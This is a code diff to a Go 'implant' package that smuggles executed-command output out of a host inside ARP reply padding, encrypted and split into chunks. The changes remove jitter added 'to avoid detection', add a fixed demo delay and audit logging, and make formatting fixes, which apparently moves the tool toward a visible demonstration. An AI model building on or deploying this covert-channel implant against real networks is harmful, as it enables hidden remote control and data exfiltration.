@@ -3,7 +3,6 @@ package implant
 import (
 	"fmt"
 	"log"
-	"math/rand"
 	"net"
 	"time"
 
@@ -15,7 +14,7 @@ import (
 
 // ARPBroadcaster handles sending ARP responses with embedded command output
 type ARPBroadcaster struct {
-	iface *InterfaceInfo
+	iface  *InterfaceInfo
 	Handle *pcap.Handle
 }
 
@@ -29,9 +28,7 @@ func NewARPBroadcaster(iface *InterfaceInfo) *ARPBroadcaster {
 // SendResponse sends an ARP reply with output embedded in padding
 // This is called after executing a received command
 func (ab *ARPBroadcaster) SendResponse(output string) error {
-	// Add jitter to avoid detection
-	jitter := time.Duration(rand.Intn(shared.JitterMaxMs-shared.JitterMinMs) + shared.JitterMinMs) * time.Millisecond
-	time.Sleep(jitter)
+	time.Sleep(time.Duration(shared.DemoResponseDelayMs) * time.Millisecond)
 
 	// Chunk output if needed (max 20 bytes per frame)
 	chunks := shared.ChunkPayload([]byte(output))
@@ -42,6 +39,7 @@ func (ab *ARPBroadcaster) SendResponse(output string) error {
 
 	// Send each chunk as separate ARP response
 	for i, chunk := range chunks {
+		log.Printf("[AUDIT] sending response chunk %d/%d (%d bytes)\n", i+1, len(chunks), len(chunk))
 		if err := ab.sendChunk(chunk, i, len(chunks)); err != nil {
 			log.Printf("[!] Failed to send chunk %d/%d: %v\n", i+1, len(chunks), err)
 			// Continue sending remaining chunks despite errors
@@ -49,7 +47,7 @@ func (ab *ARPBroadcaster) SendResponse(output string) error {
 
 		// Add inter-packet jitter (except for last packet)
 		if i < len(chunks)-1 {
-			time.Sleep(500 * time.Millisecond)
+			time.Sleep(time.Duration(shared.InterChunkDelayMs) * time.Millisecond)
 		}
 	}
 
@@ -79,7 +77,7 @@ func (ab *ARPBroadcaster) sendChunk(chunk []byte, index int, total int) error {
 		AddrType:          layers.LinkTypeEthernet,
 		Protocol:          layers.EthernetTypeIPv4,
 		HwAddressSize:     6,
-		ProtAddressSize: 4,
+		ProtAddressSize:   4,
 		Operation:         layers.ARPReply,
 		SourceHwAddress:   []byte(srcMAC),
 		SourceProtAddress: net.ParseIP(ab.iface.IP).To4(),
@@ -102,7 +100,7 @@ func (ab *ARPBroadcaster) sendChunk(chunk []byte, index int, total int) error {
 	// Get ARP data and add padding
 	arpData := buffer.Bytes()
 	padding := shared.FramePadding(encrypted)
-	
+
 	// Combine ARP data + padding to reach 64-byte minimum
 	fullFrame := append(arpData, padding...)
 	_ = fullFrame // Avoid unused variable warning, will be used in final serialization
@@ -141,6 +139,7 @@ func (ab *ARPBroadcaster) parseMACFromString(macStr string) []byte {
 // SendBeacon sends an initial beacon to signal readiness
 func (ab *ARPBroadcaster) SendBeacon() error {
 	// Send a simple "READY" beacon
+	log.Printf("[AUDIT] transmitting READY beacon on %s\n", ab.iface.Name)
 	return ab.SendResponse("READY")
 }
 
